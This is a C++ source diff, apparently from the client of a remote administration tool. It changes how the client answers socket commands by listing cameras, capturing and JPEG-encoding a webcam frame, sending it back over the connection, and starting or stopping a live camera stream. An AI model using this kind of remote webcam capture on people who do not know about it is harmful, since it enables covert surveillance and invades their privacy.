@@ -355,9 +355,10 @@ void Cliente::ProcesarComando(char* pBuffer, int iSize) {
         std::string strPaquete = std::to_string(EnumComandos::CM_Lista_Salida);
         strPaquete.append(1, CMD_DEL);
 
-        std::vector<char*> cDev = this->mod_Cam->ListNameCaptureDevices();
+        std::vector<std::string> cDev = this->mod_Cam->ListNameCaptureDevices();
         if (cDev.size() > 0) {
-            for (auto cDevice : cDev) {
+            for (std::string cDevice : cDev) {
+                DebugPrint(cDevice);
                 strPaquete += cDevice;
                 strPaquete.append(1, '|');
             }
@@ -372,6 +373,7 @@ void Cliente::ProcesarComando(char* pBuffer, int iSize) {
     }
 
     if (this->Comandos[strIn[0].c_str()] == EnumComandos::CM_Single) {
+
         HRESULT hr;
         u_int iDeviceIndex = atoi(strIn[1].c_str());
         
@@ -388,57 +390,60 @@ void Cliente::ProcesarComando(char* pBuffer, int iSize) {
             hr = this->mod_Cam->Init(this->mod_Cam->vcCams[iDeviceIndex], iDeviceIndex);
         }
         
-        //1000 para probar :v
-        for (int ii = 0; ii < 1000; ii++) {
-            if (SUCCEEDED(hr)) {
-                this->iCAMCOUNT++;
-                this->mod_Cam->vcActivated[iDeviceIndex] = true;
+        if (SUCCEEDED(hr)) {
+            this->mod_Cam->vcActivated[iDeviceIndex] = true;
 
-                DebugPrint("[!] Camara iniciada correctamente," + std::to_string(this->iCAMCOUNT) + " hasta ahora");
+            DebugPrint("[!] Camara iniciada correctamente");
 
-                std::string strHeader = std::to_string(EnumComandos::CM_Single_Salida);
-                strHeader.append(1, CMD_DEL);
+            std::string strHeader = std::to_string(EnumComandos::CM_Single_Salida);
+            strHeader.append(1, CMD_DEL);
 
-                //Testing
-                int iBufferSize = 0;
-                int iHeaderSize = strHeader.size();
-                u_int iJPGBufferSize = 0;
-                u_int uiPacketSize = 0;
-                BYTE* cBuffer = this->mod_Cam->GetFrame(iBufferSize, iDeviceIndex);
-                BYTE* cJPGBuffer = nullptr;
-                BYTE* cPacket = nullptr;
+            //Testing
+            int iBufferSize = 0;
+            int iHeaderSize = strHeader.size();
+            u_int iJPGBufferSize = 0;
+            u_int uiPacketSize = 0;
+            BYTE* cBuffer = this->mod_Cam->GetFrame(iBufferSize, iDeviceIndex);
+            BYTE* cJPGBuffer = nullptr;
+            BYTE* cPacket = nullptr;
 
-                if (cBuffer) {
-                    cJPGBuffer = this->mod_Cam->toJPEG(cBuffer, iBufferSize, iJPGBufferSize);
-                    if (cJPGBuffer) {
-                        uiPacketSize = iHeaderSize + iJPGBufferSize;
-                        cPacket = new BYTE[uiPacketSize];
-                        if (cPacket) {
-                            memcpy(cPacket, strHeader.c_str(), iHeaderSize);
-                            memcpy(cPacket + iHeaderSize, cJPGBuffer, iJPGBufferSize);
+            if (cBuffer) {
+                cJPGBuffer = this->mod_Cam->toJPEG(cBuffer, iBufferSize, iJPGBufferSize);
+                if (cJPGBuffer) {
+                    uiPacketSize = iHeaderSize + iJPGBufferSize;
+                    cPacket = new BYTE[uiPacketSize];
+                    if (cPacket) {
+                        memcpy(cPacket, strHeader.c_str(), iHeaderSize);
+                        memcpy(cPacket + iHeaderSize, cJPGBuffer, iJPGBufferSize);
 
-                            int iSent = this->cSend(this->sckSocket, (const char*)cPacket, uiPacketSize, 0, true);
-                            DebugPrint("[!] " + std::to_string(iSent) + " bytes sent");
+                        int iSent = this->cSend(this->sckSocket, (const char*)cPacket, uiPacketSize, 0, true);
+                        DebugPrint("[!] " + std::to_string(iSent) + " bytes sent");
 
-                            delete[] cPacket;
-                            cPacket = nullptr;
-                        }
-                        delete[] cJPGBuffer;
-                        cJPGBuffer = nullptr;
+                        delete[] cPacket;
+                        cPacket = nullptr;
                     }
-                }
-
-                if (cBuffer) {
-                    delete[] cBuffer;
-                    cBuffer = nullptr;
+                    delete[] cJPGBuffer;
+                    cJPGBuffer = nullptr;
                 }
             }
+
+            if (cBuffer) {
+                delete[] cBuffer;
+                cBuffer = nullptr;
+            }
         }
-        //}else {
-        //    DebugPrint("[X] mod_Cam->ListCaptureDevices error");
-       // }
 
         return;
+    }
+
+    if (this->Comandos[strIn[0].c_str()] == EnumComandos::CM_Live_Start) {
+        u_int iDeviceIndex = atoi(strIn[1].c_str());
+        this->mod_Cam->SpawnLive(iDeviceIndex);
+    }
+
+    if (this->Comandos[strIn[0].c_str()] == EnumComandos::CM_Live_Stop) {
+        u_int iDeviceIndex = atoi(strIn[1].c_str());
+        this->mod_Cam->JoinLiveThread(iDeviceIndex);
     }
     //#####################################################
 
